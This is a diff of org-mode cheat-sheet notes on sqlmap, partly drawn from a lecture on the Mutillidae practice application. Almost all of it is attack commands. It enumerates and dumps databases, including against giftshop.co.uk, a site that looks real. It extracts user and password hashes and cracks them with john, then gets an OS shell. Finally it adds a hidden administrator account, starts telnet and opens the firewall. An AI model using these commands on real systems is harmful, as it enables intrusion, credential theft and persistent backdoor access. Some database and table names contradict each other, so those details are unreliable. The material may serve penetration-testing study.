@@ -1,50 +1,155 @@
-this tool sutomates sqlinjections
+#+TAGS: sec db sqli
 
-*Basic Syntax*
+
+* SQLmap							:sec:db:sqli:
+* Description
+This tool sutomates sqlinjections
+* Usage
+** Basic Syntax
 
 > sqlmap <option> <url>
 
-*Initial Scan*
-
-> sqlmap -u <url>
-
+- Initial Scan
+#+BEGIN_SRC sh
+sqlmap -u giftshop.co.uk
+#+END_SRC
 This scan will attemp to find sql inject vulnerabilities, using preset
 injection payloads. It will also attempt to find the OS, DBMS and web
 server.
 
-*Find Databases*
-
-> sqlmap -u <url> --dbs
-
+** Find Databases
+#+BEGIN_SRC sh
+sqlmap -u giftshop.co.uk --dbs
+#+END_SRC
 Now we know from the above scan that we have a vulnerable url, we need
 to find the databases. This cmd will find the database names.
 
-*Find Tables*
-
-> sqlmap -u <url> --tables -D <database\_name>
-
+** Find Tables
+#+BEGIN_SRC sh
+sqlmap -u giftshop.co.uk --tables -D cutomers_uk
+#+END_SRC
 This will output the tables of the requested database.
 
-*Find Columns*
-
-> sqlmap -u <url> --columns -D <database\_name> -T <table\_name>
-
+** Find Columns
+#+BEGIN_SRC sh
+sqlmap -u giftshop.co.uk --columns -D customer_uk -T first_name
+#+END_SRC
 This will output the columns of the specified table.
 
-*Get data from a table*
-
-> sqlmap -u <url> --dump -D <database\_name> -T <table\_name>
-
+** Get data from a table
+#+BEGIN_SRC sh
+sqlmap -u <url> --dump -D <database\_name> -T <table\_name>
+#+END_SRC
 This will produce output very similar to mysqldump.
 
-*More details*
-
+** More details
 Tell sqlmap where to inject with *
-
-> sqlmap -u http://www.domain.com/class\_name/method/40*/80
+#+BEGIN_SRC sh 
+sqlmap -u http://www.domain.com/class\_name/method/40*/80
+#+END_SRC
 
 Sometimes sqlmap fails to connect this can be counted with
 --random-agent. This will attempt to connect with a chrome or mozilla
 signature.
+#+BEGIN_SRC sh
+sqlmap -u <url> --random-agent
+#+END_SRC
 
-> sqlmap -u <url> --random-agent
+* Lecture
+** [[https://www.youtube.com/watch?v%3DvTB3Ze901pM][Introduction to SQLMap on Mutillidae]]
+- use burp suite to intercept the POST to the website
+- copy of of the out put that output in surp suite (the POST, cookies, url , username etc) and place it into a file.
+- sqlmap will be able to parse this file and use it
+#+BEGIN_SRC sh
+sqlmap -r burp_suite.request --banner
+#+END_SRC
+This will attempt to grab the db banner
+
+-- fingerprint
+- This option is like banner+
+- this provides patch levels and versions
+  
+- Finding User infomation
+#+BEGIN_SRC sh
+sqlmap -r burp_suite.request --current-user --current-db --hostname --is-dba
+#+END_SRC
+- kowing fi the user is a dba is very important
+  
+- Dump Users and Passwords
+#+BEGIN_SRC sh
+sqlmap -r burp_suite.request --users --passwords
+#+END_SRC
+
+- Dumping Databases
+#+BEGIN_SRC sh
+sqlmap -r burp_suite.request -D
+#+END_SRC
+
+- Dumping Tables
+#+BEGIN_SRC sh
+sqlmap -r burp_suite.request -T
+#+END_SRC
+
++ Dumping the columns
+#+BEGIN_SRC sh
+sqlmap -r burp_suite.request -D mysql -T user --columns
+#+END_SRC
+or
+#+BEGIN_SRC sh
+sqlmap -r burp_suite.request -D mysql -T user --common-columns
+#+END_SRC
+if sqlmap gets a 302/303 decline, the redirect is taking you to login success or failure
+
++ Attempt to get user and password column contents
+#+BEGIN_SRC sh
+sqlmap -r burp_suite.request -D mysql -T user -C user,password
+#+END_SRC
+- Sometimes useful to use sort query if warning is thrown with the above
+#+BEGIN_SRC sh
+sqlmap -r burp_suite.request -D mysql -T user --sql-query='SELECT User, Password FROM mysql.user ORDER BY user Desc'
+#+END_SRC
+- With the output hashes put them into a file to fomat:
+root:*FY192LLkSLFJKSJFS88408SFJ8CH
+- then run john on the file 
+#+BEGIN_SRC sh
+john --format=mysql-sha1 hashes.txt
+#+END_SRC
+john can be interrupted and show hashes that have been cracked up to that point
+#+BEGIN_SRC sh
+john --format=mysql-sha1 hashes.txt --show
+#+END_SRC
+
++ SQLmap OS Shell
+#+BEGIN_SRC sh
+sqlmap -r burp_suite.request -D mysql -T user --os-shell
+#+END_SRC
+- you will be asked what the underlying language is, a deault will be available
+- also asks where the web files are hosted, again a deault is offered
+- this uses sql to access the system
+- though we are root on the db, we may not be root on the system to check on windows run:
+#+BEGIN_SRC sh
+sc query tlntsvr
+#+END_SRC
+- can now start the tlntsvr
+#+BEGIN_SRC sh
+sc start tlntsvr
+#+END_SRC
+- if this fails, due to the server being hardend, it will need to be reconfigured
+#+BEGIN_SRC sh
+sc config tlntsvr start= demand
+sc status start tlntsvr
+#+END_SRC
+- the telnet server should now be up and running
+- we don't have an account to login into telnet with, so lets create one
+#+BEGIN_SRC sh
+net user root toor /add
+net localgroup TelnetClients /add
+net localgroup TelnetClients root /add
+net localgroup Administrators root /add
+netsh firewall add portopening protcol=tcp port=23 name=telnet mode=enabled scope=custom addresses=192.168.56.101
+#+END_SRC
+- should now be able to telnet into the windows server
+
+* Tutorial
+* Books
+* Links
